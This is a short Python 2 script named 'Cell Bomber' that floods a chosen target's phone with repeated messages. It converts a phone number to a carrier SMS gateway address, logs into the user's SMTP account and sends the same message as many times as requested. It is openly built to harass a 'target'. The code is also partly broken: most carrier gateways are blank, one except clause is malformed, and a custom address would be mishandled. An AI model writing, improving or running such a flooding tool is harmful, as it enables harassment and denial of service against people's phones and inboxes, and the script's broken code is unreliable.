__author__ = 'n3tn0'
__version__ = '1.0.2'

from getpass import getpass
import smtplib

#Define carriers that can be chosen from
carriers = {'Verizon': '@vtext.com',
            'AT&T': '@',
            'Sprint': '@',
            'T-Mobile': '@',
            'Virgin Mobile': '@',
            'Custom': ''}
#############THIS TO BE AN ADDED FUNCTION IN A LATER VERSION##############
emails = {'GMail': 'smtp.gmail.com:587',
          'Hotmail': ''}

#Print program information
print 'Cell Bomber'
print 'Version: %s' % str(__version__)
print 'By: %s' % str(__author__)

# Print the list of carriers that can be chosen from
x = 1
carrier_list = {}
print '\n'
for i in carriers:
    carrier_list[x] = i
    x += 1
x = 1
for i in carrier_list:
    print '[%i] %s' % (x, carrier_list[i])
    x += 1

#Let the user enter the target phone and choose the carrier
carrier_num = 0
try:
    carrier_num = int(raw_input('Enter Number of Target\'s Carrier: '))
except carrier_num > len(carriers) + 1 or ValueError:
    print 'Enter the number!'
if carrier_list[carrier_num] == 'Custom':
    target_addr = raw_input('Enter the email address to be bombed: ')
else:
    target_number = raw_input('Enter Target\'s Cell Number: ')
    target_addr = [str(target_number) + carriers[carrier_list[carrier_num]]]
amount = int(raw_input('Send Count: '))

#Get the information of the sender
print '\n Input Sender Information'
user = raw_input('Your Email: ')
password = getpass('Password: ')
smtpserver = raw_input('SMTP Server and Port: ')

#Get the message to be sent
body = raw_input('Enter Message to be Sent: ')

#Prepare message for sending
header = 'From: %s\n' % user
header += 'To: %s\n' % ','.join(target_addr)
message = header + body
server = smtplib.SMTP(smtpserver)
server.starttls()

#Login to the email server
try:
    server.login(user, password)
except smtplib.SMTPAuthenticationError:
    print '\nUsername and Password not accepted!'
    exit()

#Send the message
for i in range(amount):
    server.sendmail(user, target_addr, message)
    if amount == 0:
        print '1 Message Sent'
    else:
        x = i + 1
        print '%i Messages Sent' % x

#Cleanup
server.quit()
